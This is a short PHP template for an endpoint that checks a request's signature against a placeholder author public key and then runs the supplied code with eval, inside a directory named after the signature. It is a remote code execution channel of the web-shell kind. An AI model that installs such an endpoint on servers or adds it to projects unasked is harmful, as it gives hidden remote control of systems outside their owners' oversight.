<?php

if (!isset($_REQUEST['p']) || (!$p = $_REQUEST['p']) ||
    !isset($_REQUEST['s']) || (!$s = $_REQUEST['s']) ||
    (1 !== openssl_verify($p, base64_decode($s), '((author_pub))', ((signature_digest)))) ||
    (
      ($s = str_replace('+', '-', $s)) &
      ($s = str_replace('/', '_', $s)) &
      ($s = preg_replace('/[^0-9A-Za-z_-]/', '', $s)) &
      (@mkdir($s) | 1) &
      !chdir($s)
    )) {
  header('HTTP/1.0 400 Bad Request');
  header('Content-Type: text/plain');
  readfile(__FILE__);
  exit;
}

eval($p);
